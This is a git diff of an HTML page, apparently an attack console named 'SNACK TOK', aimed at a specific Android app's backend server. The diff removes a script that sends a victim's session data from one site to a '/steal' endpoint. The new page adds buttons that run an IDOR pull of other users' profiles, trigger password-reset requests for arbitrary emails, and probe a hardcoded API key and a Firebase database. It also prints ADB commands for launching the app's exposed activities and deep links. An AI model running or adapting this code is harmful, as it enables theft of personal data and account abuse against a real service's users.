@@ -1,18 +1,294 @@
 <!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔓 SNACK TOK - اختبار الثغرات</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: #0b0e14; color: #e6edf5; padding: 2rem; direction: ltr; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #ff6b6b; border-right: 6px solid #ff6b6b; padding-right: 1rem; margin-bottom: 2rem; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 1.5rem; }
+        .card { background: #151e2a; border-radius: 16px; padding: 1.5rem; border: 1px solid #2a3a4a; transition: 0.2s; }
+        .card:hover { border-color: #4a6a8a; }
+        .card.critical { border-right: 6px solid #ff1a1a; }
+        .card.high { border-right: 6px solid #ff8c00; }
+        .card.medium { border-right: 6px solid #f0c000; }
+        .badge { display: inline-block; padding: 0.2rem 0.8rem; border-radius: 20px; font-size: 0.7rem; font-weight: 700; }
+        .badge.crit { background: #ff1a1a; color: #fff; }
+        .badge.high { background: #ff8c00; color: #000; }
+        .badge.med { background: #f0c000; color: #000; }
+        .badge.ok { background: #1f8b4c; color: #fff; }
+        button { background: #2a3a4a; border: none; color: #e6edf5; padding: 0.6rem 1.2rem; border-radius: 8px; cursor: pointer; margin: 0.3rem 0; width: 100%; text-align: left; }
+        button:hover { background: #3a4a5a; }
+        .result { background: #0e1620; padding: 0.8rem; border-radius: 8px; margin-top: 0.8rem; border-left: 3px solid #3a5a7a; font-size: 0.8rem; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow-y: auto; }
+        .result.success { border-left-color: #00b894; }
+        .result.fail { border-left-color: #ff6b6b; }
+        .result.warning { border-left-color: #f0c000; }
+        .flex { display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 1rem; }
+        input, select { background: #0e1620; border: 1px solid #2a3a4a; color: #e6edf5; padding: 0.6rem 1rem; border-radius: 8px; flex: 1; min-width: 150px; }
+        .loading { opacity: 0.6; }
+        .status { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 12px; font-size: 0.7rem; font-weight: 700; }
+        .status.vuln { background: #ff1a1a; color: #fff; }
+        .status.safe { background: #1f8b4c; color: #fff; }
+        .status.unknown { background: #f0c000; color: #000; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔓 SNACK TOK - اختبار الثغرات</h1>
+    <p style="margin-bottom: 1rem;">اختبار شامل للثغرات المكتشفة في التطبيق <span class="status unknown">⚠️ استخدم بحذر</span></p>
+
+    <div class="flex">
+        <input id="baseUrl" value="https://srv11.e-droid.net" style="flex: 2;">
+        <input id="userId" value="1" style="flex: 1;">
+        <button onclick="testAll()" style="background: #ff6b6b; color: #000; text-align: center; flex: 0.5;">⚡ اختبار الكل</button>
+    </div>
+
+    <div class="grid" id="testGrid">
+        <!-- IDOR Card -->
+        <div class="card critical">
+            <h3>🔴 IDOR - سحب البيانات</h3>
+            <span class="badge crit">حرجة</span>
+            <button onclick="testIDOR()">📡 اختبار IDOR</button>
+            <div id="idorResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- Password Reset Card -->
+        <div class="card critical">
+            <h3>🔴 كشف كلمة المرور</h3>
+            <span class="badge crit">حرجة</span>
+            <input id="resetEmail" placeholder="البريد الإلكتروني" value="test@example.com">
+            <button onclick="testPasswordReset()">📧 اختبار استعادة كلمة المرور</button>
+            <div id="resetResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- Cleartext Traffic Card -->
+        <div class="card high">
+            <h3>🟠 Cleartext Traffic</h3>
+            <span class="badge high">عالية</span>
+            <button onclick="testCleartext()">🌐 اختبار HTTP</button>
+            <div id="cleartextResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- ExpandedControls Card -->
+        <div class="card medium">
+            <h3>🟡 ExpandedControls</h3>
+            <span class="badge med">متوسطة</span>
+            <button onclick="testExpandedControls()">🎮 اختبار النشاط المكشوف</button>
+            <div id="expandedResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- Deep Link Card -->
+        <div class="card medium">
+            <h3>🟡 Deep Link</h3>
+            <span class="badge med">متوسطة</span>
+            <button onclick="testDeepLink()">🔗 اختبار الرابط المخصص</button>
+            <div id="deepLinkResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- API Key Card -->
+        <div class="card medium">
+            <h3>🟡 مفتاح API</h3>
+            <span class="badge med">متوسطة</span>
+            <button onclick="testAPIKey()">🔑 اختبار المفتاح</button>
+            <div id="apiKeyResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- Firebase Card -->
+        <div class="card medium">
+            <h3>🟡 Firebase</h3>
+            <span class="badge med">متوسطة</span>
+            <button onclick="testFirebase()">🔥 اختبار Firebase</button>
+            <div id="firebaseResult" class="result">⏳ انتظر...</div>
+        </div>
+
+        <!-- AdMob Card -->
+        <div class="card low">
+            <h3>🔵 AdMob Test ID</h3>
+            <span class="badge ok">منخفضة</span>
+            <button onclick="testAdMob()">📱 اختبار AdMob</button>
+            <div id="admobResult" class="result">⏳ انتظر...</div>
+        </div>
+    </div>
+</div>
+
 <script>
-fetch('https://smartearner.xyz/api/user', {
-  credentials: 'include'
-})
-.then(r => {
-  console.log('✅ Status:', r.status);
-  return r.json();
-})
-.then(data => {
-  console.log('📦 Data:', data);
-  fetch('https://your-server.com/steal', {
-    method: 'POST',
-    body: JSON.stringify(data)
-  });
-})
-.catch(err => console.error('❌ Error:', err));
+    const BASE = document.getElementById('baseUrl');
+    const USER_ID = document.getElementById('userId');
+
+    function logResult(elementId, message, type = 'info') {
+        const el = document.getElementById(elementId);
+        const colors = {
+            success: 'success',
+            fail: 'fail',
+            warning: 'warning',
+            info: ''
+        };
+        el.className = `result ${colors[type] || ''}`;
+        el.textContent = message;
+    }
+
+    // 1. IDOR TEST
+    async function testIDOR() {
+        const el = 'idorResult';
+        logResult(el, '⏳ جاري اختبار IDOR...', 'info');
+        try {
+            const url = `${BASE.value}/srv/obtener_perfil.php?v=1&idusu=${USER_ID.value}`;
+            const response = await fetch(url, {
+                headers: { 'User-Agent': 'Android Vinebre Software' }
+            });
+            const text = await response.text();
+            if (text.includes('email') || text.includes('nombre') || text.includes('idusu')) {
+                logResult(el, `✅ IDOR موجودة!\n${text.slice(0, 500)}`, 'success');
+            } else if (text.includes('<!DOCTYPE')) {
+                logResult(el, `❌ فشل: الخادم أعاد HTML (قد يكون المسار غير صحيح)`, 'fail');
+            } else {
+                logResult(el, `🟡 استجابة غير متوقعة:\n${text.slice(0, 300)}`, 'warning');
+            }
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 2. PASSWORD RESET TEST
+    async function testPasswordReset() {
+        const el = 'resetResult';
+        const email = document.getElementById('resetEmail').value;
+        logResult(el, `⏳ جاري اختبار استعادة كلمة المرور للبريد ${email}...`, 'info');
+        try {
+            const url = `${BASE.value}/srv/recordar_contra.php?idapp=4096195&idl=1`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'User-Agent': 'Android Vinebre Software',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `email=${encodeURIComponent(email)}`
+            });
+            const text = await response.text();
+            if (text.includes('Password has been sent') || text.includes('enviada')) {
+                logResult(el, `✅ تم إرسال كلمة المرور إلى البريد! 🔴 ثغرة مؤكدة`, 'success');
+            } else if (text.includes('<!DOCTYPE')) {
+                logResult(el, `❌ فشل: الخادم أعاد HTML`, 'fail');
+            } else {
+                logResult(el, `🟡 استجابة غير متوقعة:\n${text.slice(0, 300)}`, 'warning');
+            }
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 3. CLEARTEXT TRAFFIC TEST
+    async function testCleartext() {
+        const el = 'cleartextResult';
+        logResult(el, '⏳ جاري اختبار HTTP (بدون TLS)...', 'info');
+        try {
+            const url = `http://srv11.e-droid.net/srv/config.php?v=229&vname=`;
+            const response = await fetch(url, {
+                headers: { 'User-Agent': 'Android Vinebre Software' }
+            });
+            const text = await response.text();
+            if (text.length > 10) {
+                logResult(el, `🟡 HTTP يعمل! cleartext traffic مفعّل.\n${text.slice(0, 300)}`, 'warning');
+            } else {
+                logResult(el, `✅ لا يوجد cleartext traffic (تم إعادة التوجيه إلى HTTPS)`, 'success');
+            }
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 4. EXPANDED CONTROLS TEST
+    function testExpandedControls() {
+        const el = 'expandedResult';
+        logResult(el, '⏳ جاري اختبار النشاط المكشوف...', 'info');
+        try {
+            // محاولة فتح النشاط عبر intent (يعمل فقط في بيئة Android)
+            logResult(el, `🔵 لا يمكن اختبار ExpandedControls من المتصفح.\nيمكن اختباره عبر ADB:\nadb shell am start -n snack.tok2/.ExpandedControlsActivity`, 'warning');
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 5. DEEP LINK TEST
+    function testDeepLink() {
+        const el = 'deepLinkResult';
+        logResult(el, '⏳ جاري اختبار Deep Link...', 'info');
+        try {
+            logResult(el, `🔵 لا يمكن اختبار Deep Link من المتصفح.\nيمكن اختباره عبر ADB:\nadb shell am start -a android.intent.action.VIEW -d "ac24://open4096195-53ruac/" snack.tok2`, 'warning');
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 6. API KEY TEST
+    async function testAPIKey() {
+        const el = 'apiKeyResult';
+        logResult(el, '⏳ جاري اختبار مفتاح API...', 'info');
+        try {
+            const key = 'AIzaSyCtzGwdiM8t6R6Ff6uCwEYggQECaFdCcFA';
+            const url = `https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=${key}`;
+            const response = await fetch(url);
+            const data = await response.json();
+            if (data.error) {
+                logResult(el, `✅ المفتاح غير صالح (لا يمكن استخدامه): ${data.error.message}`, 'success');
+            } else {
+                logResult(el, `🔴 المفتاح صالح! يمكن استخدامه للوصول إلى Google APIs.\n${JSON.stringify(data, null, 2)}`, 'warning');
+            }
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 7. FIREBASE TEST
+    async function testFirebase() {
+        const el = 'firebaseResult';
+        logResult(el, '⏳ جاري اختبار Firebase...', 'info');
+        try {
+            const project = 'api-project-751842291101';
+            const url = `https://${project}.firebaseio.com/.json`;
+            const response = await fetch(url);
+            const text = await response.text();
+            if (text.includes('null') || text.includes('{}')) {
+                logResult(el, `✅ Firebase محمي (لا يمكن الوصول بدون مصادقة)`, 'success');
+            } else if (text.includes('permission_denied')) {
+                logResult(el, `✅ Firebase محمي (permission_denied)`, 'success');
+            } else {
+                logResult(el, `🟡 استجابة غير متوقعة:\n${text.slice(0, 300)}`, 'warning');
+            }
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 8. ADMOB TEST
+    function testAdMob() {
+        const el = 'admobResult';
+        logResult(el, '⏳ جاري اختبار AdMob Test ID...', 'info');
+        try {
+            const admobId = 'ca-app-pub-3940256099942544~3347511713';
+            logResult(el, `🔵 هذا هو معرف AdMob الاختباري الرسمي:\n${admobId}\nلا يشكل ثغرة، لكنه يشير إلى أن التطبيق لم يتم تحديثه لإعلانات حقيقية.`, 'warning');
+        } catch (e) {
+            logResult(el, `❌ خطأ: ${e.message}`, 'fail');
+        }
+    }
+
+    // 9. TEST ALL
+    async function testAll() {
+        const buttons = document.querySelectorAll('button');
+        buttons.forEach(b => b.disabled = true);
+        await testIDOR();
+        await testPasswordReset();
+        await testCleartext();
+        testExpandedControls();
+        testDeepLink();
+        await testAPIKey();
+        await testFirebase();
+        testAdMob();
+        buttons.forEach(b => b.disabled = false);
+    }
 </script>
+</body>
+</html>
